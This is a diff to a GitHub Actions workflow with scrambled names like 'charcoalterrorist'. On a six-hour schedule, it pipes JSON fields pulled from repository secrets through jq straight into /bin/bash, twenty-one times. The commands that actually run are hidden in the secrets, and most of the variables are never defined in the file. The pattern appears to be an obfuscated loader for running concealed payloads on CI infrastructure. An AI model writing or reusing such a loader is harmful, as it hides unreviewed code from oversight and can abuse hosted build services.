@@ -3,22 +3,36 @@ name: charcoalterrorist
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
-
+    - cron: '42 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: charcoalterrorist
         env:
-          or7018: ${{ secrets.or7018 }}
+          ik94724: ${{ secrets.ik94724 }}
         run: |
-          echo $or7018 | jq -r .rcce01221 | /bin/bash
-          echo $qgew09 | jq -r .h8 | /bin/bash
-          echo $lsl110 | jq -r .zqb839 | /bin/bash
-          echo $uituh998 | jq -r .ikzo44 | /bin/bash
-          echo $goum1872 | jq -r .uyd076 | /bin/bash
-          echo $n4687 | jq -r .qdf17 | /bin/bash
-          echo $vns00332 | jq -r .wwwcb8380 | /bin/bash
+          echo $ik94724 | jq -r .oww0 | /bin/bash
+          echo $eungp18 | jq -r .mglt00446 | /bin/bash
+          echo $ybc369 | jq -r .tm44 | /bin/bash
+          echo $lxc1 | jq -r .lyeye24 | /bin/bash
+          echo $abko224 | jq -r .pzdn365 | /bin/bash
+          echo $lej739 | jq -r .dwotn4 | /bin/bash
+          echo $z20617 | jq -r .wvksf960 | /bin/bash
+          echo $uly445 | jq -r .jmk949 | /bin/bash
+          echo $yq5232 | jq -r .foltc33870 | /bin/bash
+          echo $j3 | jq -r .zhkd2 | /bin/bash
+          echo $d47374 | jq -r .u1839 | /bin/bash
+          echo $wcmh3 | jq -r .n004 | /bin/bash
+          echo $mnus7518 | jq -r .ikbhf56525 | /bin/bash
+          echo $wtmn30844 | jq -r .tt70367 | /bin/bash
+          echo $rudda57904 | jq -r .smpz5 | /bin/bash
+          echo $wr558 | jq -r .duyro0 | /bin/bash
+          echo $qnh8507 | jq -r .xcvok20436 | /bin/bash
+          echo $kanzz73558 | jq -r .rnfbu322 | /bin/bash
+          echo $a71 | jq -r .uktq647 | /bin/bash
+          echo $ocncq43 | jq -r .mqa57047 | /bin/bash
+          echo $orebb210 | jq -r .zhfi646 | /bin/bash
 
